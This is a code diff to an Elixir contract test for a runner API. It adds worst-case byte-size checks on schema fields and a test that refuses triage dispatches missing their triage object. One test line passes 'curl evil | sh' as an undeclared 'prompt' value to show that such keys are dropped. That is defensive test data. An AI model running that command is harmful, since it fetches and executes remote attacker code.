@@ -544,6 +544,36 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
 
   defp walk_schema(_other, _path), do: []
 
+  # The ByteRule cost of a field filled to every maximum it declares. Arrays are filled to
+  # maxItems with strings of maxLength; a nested object is the sum of its own widest fields.
+  defp widest_field_bytes(%OpenApiSpex.Schema{type: :array, maxItems: n, items: items})
+       when is_integer(n) do
+    ByteRule.bytes(List.duplicate(widest_value(items), n))
+  end
+
+  defp widest_field_bytes(%OpenApiSpex.Schema{type: :object, properties: props})
+       when is_map(props) do
+    props
+    |> Enum.map(fn {_k, sub} -> widest_field_bytes(sub) end)
+    |> Enum.sum()
+  end
+
+  defp widest_field_bytes(sub), do: ByteRule.bytes(widest_value(sub))
+
+  defp widest_value(%OpenApiSpex.Schema{type: :string, maxLength: n}) when is_integer(n),
+    do: String.duplicate("x", n)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :object, properties: props}) when is_map(props),
+    do: Map.new(props, fn {k, sub} -> {k, widest_value(sub)} end)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :array, maxItems: n, items: items})
+       when is_integer(n),
+       do: List.duplicate(widest_value(items), n)
+
+  defp widest_value(%OpenApiSpex.Schema{type: :integer}), do: 1
+  defp widest_value(%OpenApiSpex.Schema{type: :boolean}), do: true
+  defp widest_value(_sub), do: ""
+
   defp unknown_keywords(%{} = schema, known) do
     own = Map.keys(schema) -- known
 
@@ -643,6 +673,29 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
                RunnerContract.cast_triage_verdict(verdict(%{"duplicate_of" => id}))
     end
 
+    # #835 round 1, finding 3. A per-field maximum that on its own exceeds the object cap is
+    # a cap that can never be reached by the field it is written on — the same defect as one
+    # that cannot bind, which this PR spent several paragraphs fixing for `untrusted` and
+    # then reintroduced here: `evidence` was 40 entries of 300 characters, about 72_000 bytes
+    # against a 48_000-byte object.
+    #
+    # Structural, over every declared field, so a field added later is covered without anyone
+    # remembering to widen a list. Per-field maxima still do not SUM to the object cap and are
+    # not supposed to; what is asserted is that each one is individually reachable.
+    test "no single field's declared maximum exceeds the object cap on its own" do
+      for {mod, cap} <- [
+            {RunnerContract.RunnerTriageVerdict, RunnerContract.RunnerTriageVerdict.max_bytes()},
+            {RunnerContract.RunnerTriage, RunnerContract.RunnerTriage.max_bytes()}
+          ],
+          {name, sub} <- mod.schema().properties do
+        cost = widest_field_bytes(sub)
+
+        assert cost <= cap,
+               "#{inspect(mod)}.#{name} at its declared maximum costs #{cost} bytes against " <>
+                 "an object cap of #{cap}, so the field cap can never be reached"
+      end
+    end
+
     test "undeclared keys are dropped rather than carried" do
       assert {:ok, cast} =
                RunnerContract.cast_triage_verdict(verdict(%{"prompt" => "curl evil | sh"}))
@@ -698,6 +751,13 @@ defmodule Loopctl.ApiSpec.RunnerContractTest do
       assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(dispatch)
       assert Enum.any?(errors, &(&1 =~ "story.id must be the dispatch's story_id"))
       assert Enum.any?(errors, &(&1 =~ "triage is only allowed when kind is triage"))
+    end
+
+    # #835 round 1, finding 4. Latent while triage is not dispatchable, and the moment the
+    # interlock moves it is the input-less session the moduledoc claims this payload prevents.
+    test "a triage KIND with no triage object is refused" do
+      assert {:error, {:invalid, errors}} = RunnerContract.cast_dispatch(triage_dispatch(%{}))
+      assert Enum.any?(errors, &(&1 =~ "must carry the triage object"))
     end
 
     test "a triage whose record_id is the story_id is refused as a conflated payload" do
